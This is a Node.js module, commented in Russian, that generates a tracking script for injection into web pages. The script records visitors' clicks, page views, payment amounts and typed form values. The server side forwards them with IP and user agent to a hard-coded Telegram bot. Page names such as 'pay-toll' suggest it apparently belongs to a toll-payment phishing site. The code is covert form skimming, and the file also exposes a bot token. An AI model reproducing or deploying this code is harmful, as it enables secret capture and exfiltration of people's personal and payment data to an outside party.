/**
 * Telegram Logger - отправка уведомлений о действиях пользователей
 * Одна сессия = одно редактируемое сообщение
 */

const https = require('https');
const logger = require('./logger');

// Telegram Bot Configuration
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8368526952:AAGDK9Q3KfOVNltB0uvUihs0-9DzN8StWDo';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-5166820954';

// Store session data: sessionId -> { messageId, logs: [], ip, userAgent, startTime }
const sessions = new Map();

// Clean old sessions after 30 minutes
const SESSION_TIMEOUT = 30 * 60 * 1000;

setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of sessions) {
    if (now - session.startTime > SESSION_TIMEOUT) {
      sessions.delete(sessionId);
    }
  }
}, 60 * 1000); // Check every minute

/**
 * Send message to Telegram
 */
async function sendTelegramMessage(text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true,
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) {
            resolve(result.result);
          } else {
            reject(new Error(result.description));
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

/**
 * Edit existing message in Telegram
 */
async function editTelegramMessage(messageId, text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: CHAT_ID,
      message_id: messageId,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true,
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/editMessageText`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) {
            resolve(result.result);
          } else {
            // If message wasn't modified, it's ok
            if (result.description && result.description.includes('message is not modified')) {
              resolve(null);
            } else {
              reject(new Error(result.description));
            }
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

/**
 * Get short session ID for display
 */
function getShortId(sessionId) {
  // Extract just the random part
  const parts = sessionId.split('_');
  return parts.length > 2 ? parts[2].toUpperCase() : sessionId.substring(0, 8).toUpperCase();
}

/**
 * Format session logs for Telegram message
 */
function formatSessionMessage(session, sessionId) {
  const shortId = getShortId(sessionId);
  
  let message = `🔗 <b>Client</b> [<code>${shortId}</code>]\n`;
  message += `📱 <i>${session.userAgent || 'Unknown'}</i>\n`;
  message += `🌍 IP: <code>${session.ip || 'Unknown'}</code>\n`;
  message += `\n`;
  
  // Add each log entry
  session.logs.forEach((log) => {
    switch (log.type) {
      case 'page_view':
        message += `↪️ Перешёл на страницу: "<b>${log.page}</b>"\n`;
        break;
      case 'current_page':
        message += `📍 Находится на странице: "<b>${log.page}</b>"\n`;
        break;
      case 'input_start':
        message += `✏️ Заполняет форму: [${log.field}]\n`;
        break;
      case 'input':
        message += `📝 Заполнил форму [${log.field}]: "<b>${log.value}</b>"\n`;
        break;
      case 'click':
        message += `👆 Нажал: "<b>${log.element}</b>"\n`;
        break;
      case 'form_submit':
        message += `📤 Отправил форму: "<b>${log.form}</b>"\n`;
        break;
      case 'payment':
        message += `💳 Перешёл на оплату: <b>€${log.amount}</b>\n`;
        break;
      case 'payment_redirect':
        message += `🔄 Перенаправлен на оплату: <b>€${log.amount}</b>\n`;
        break;
      case 'error':
        message += `❌ Ошибка: "${log.message}"\n`;
        break;
      default:
        if (log.message) {
          message += `• ${log.message}\n`;
        }
    }
  });
  
  return message;
}

/**
 * Track user action
 * @param {string} sessionId - Unique session identifier
 * @param {object} action - Action data { type, page?, field?, value?, element?, etc }
 * @param {object} meta - Metadata { ip, userAgent }
 */
async function trackAction(sessionId, action, meta = {}) {
  try {
    let session = sessions.get(sessionId);
    
    // Create new session if doesn't exist
    if (!session) {
      session = {
        messageId: null,
        logs: [],
        ip: meta.ip || 'Unknown',
        userAgent: meta.userAgent ? meta.userAgent.substring(0, 100) : 'Unknown',
        startTime: Date.now(),
      };
      sessions.set(sessionId, session);
    }
    
    // Update IP if provided
    if (meta.ip && session.ip === 'Unknown') {
      session.ip = meta.ip;
    }
    
    // Add action to logs (avoid duplicates for page_view)
    const lastLog = session.logs[session.logs.length - 1];
    const isDuplicate = lastLog && 
      lastLog.type === action.type && 
      lastLog.page === action.page &&
      lastLog.field === action.field &&
      lastLog.value === action.value;
    
    if (!isDuplicate) {
      session.logs.push({
        ...action,
        time: Date.now(),
      });
    }
    
    // Limit logs to last 20 entries
    if (session.logs.length > 20) {
      session.logs = session.logs.slice(-20);
    }
    
    // Format message
    const messageText = formatSessionMessage(session, sessionId);
    
    // Send or edit message
    if (session.messageId) {
      // Edit existing message
      await editTelegramMessage(session.messageId, messageText);
    } else {
      // Send new message
      const result = await sendTelegramMessage(messageText);
      if (result && result.message_id) {
        session.messageId = result.message_id;
      }
    }
    
    logger.debug(`[TelegramLogger] Tracked action for session ${sessionId}:`, action);
    return true;
  } catch (error) {
    logger.error('[TelegramLogger] Error tracking action:', error.message);
    return false;
  }
}

/**
 * Generate tracking script to inject into HTML
 */
function getTrackingScript() {
  return `
<script>
(function() {
  'use strict';
  
  // Generate or get session ID
  let sessionId = sessionStorage.getItem('_trackSessionId');
  if (!sessionId) {
    sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    sessionStorage.setItem('_trackSessionId', sessionId);
  }
  
  // Track function
  function track(action) {
    try {
      fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: sessionId,
          action: action
        }),
        keepalive: true
      }).catch(function() {});
    } catch(e) {}
  }
  
  // Get page name from URL
  function getPageName() {
    const path = window.location.pathname;
    if (path === '/' || path === '') return 'Главная';
    const name = path.replace(/^\//, '').replace(/\\/$/, '');
    // Translate common pages
    const translations = {
      'pay-toll': 'Оплата',
      'login': 'Вход',
      'register': 'Регистрация',
      'account': 'Аккаунт',
      'ticket': 'Билет',
      'contact': 'Контакты'
    };
    return translations[name] || name.charAt(0).toUpperCase() + name.slice(1);
  }
  
  // Track page view on load
  track({ type: 'page_view', page: getPageName() });
  
  // Track navigation (SPA support)
  let lastPath = window.location.pathname;
  setInterval(function() {
    if (window.location.pathname !== lastPath) {
      lastPath = window.location.pathname;
      track({ type: 'page_view', page: getPageName() });
    }
  }, 500);
  
  // Track input changes (with debounce)
  const inputTimers = {};
  const activeInputs = {};
  
  document.addEventListener('focus', function(e) {
    const el = e.target;
    if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT') {
      const fieldName = el.name || el.id || el.placeholder || el.type || 'поле';
      if (el.type !== 'password' && el.type !== 'hidden' && !activeInputs[fieldName]) {
        activeInputs[fieldName] = true;
        track({ type: 'input_start', field: fieldName });
      }
    }
  }, true);
  
  document.addEventListener('input', function(e) {
    const el = e.target;
    if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT') {
      const fieldName = el.name || el.id || el.placeholder || el.type || 'поле';
      
      // Don't track passwords or hidden
      if (el.type === 'password' || el.type === 'hidden') return;
      
      // Debounce - send after 1.5 seconds of no typing
      clearTimeout(inputTimers[fieldName]);
      inputTimers[fieldName] = setTimeout(function() {
        const value = el.value;
        if (value && value.length > 0) {
          track({ type: 'input', field: fieldName, value: value.substring(0, 50) });
        }
      }, 1500);
    }
  }, true);
  
  // Track button clicks
  document.addEventListener('click', function(e) {
    const el = e.target.closest('button, input[type="submit"], a.btn, .button, [role="button"], .pay-button');
    if (el) {
      let text = el.innerText || el.value || el.title || el.name || 'кнопка';
      text = text.trim().substring(0, 30);
      
      // Check if it's a payment button
      if (text.toLowerCase().includes('pay') || el.classList.contains('pay-button')) {
        // Try to find amount
        const amountEl = document.querySelector('.total, .amount, [data-amount]');
        const amount = amountEl ? amountEl.innerText.replace(/[^0-9.,]/g, '') : null;
        if (amount) {
          track({ type: 'payment', amount: amount });
        } else {
          track({ type: 'click', element: text });
        }
      } else {
        track({ type: 'click', element: text });
      }
    }
  }, true);
  
  // Track form submissions
  document.addEventListener('submit', function(e) {
    const form = e.target;
    const formName = form.name || form.id || 'форма';
    track({ type: 'form_submit', form: formName.substring(0, 30) });
  }, true);
  
  console.log('[Tracker] Отслеживание сессии активировано:', sessionId);
})();
</script>`;
}

module.exports = {
  trackAction,
  getTrackingScript,
  sendTelegramMessage,
  editTelegramMessage,
};
